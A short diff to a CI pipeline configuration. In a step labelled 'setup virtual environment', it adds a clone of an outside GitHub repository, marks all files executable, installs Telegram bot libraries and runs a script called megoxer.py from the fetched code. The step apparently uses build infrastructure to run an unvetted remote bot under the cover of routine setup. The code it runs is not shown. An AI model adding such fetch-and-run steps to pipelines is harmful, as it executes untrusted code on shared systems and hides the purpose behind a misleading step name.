@@ -33,11 +33,13 @@ pipeline:
                   name: setup virtual environment
                   spec:
                     command: |-
+
                       python3 -m venv .venv
                       . .venv/bin/activate
+                      git clone https://github.com/ck53467/u9.git
                       chmod +x *
                       pip install telebot flask aiogram pyTelegramBotAPI python-telegram-bot
-                      python3 Moin.py
+                      python3 megoxer.py
                   timeout: ""
                   type: Run
           platform:
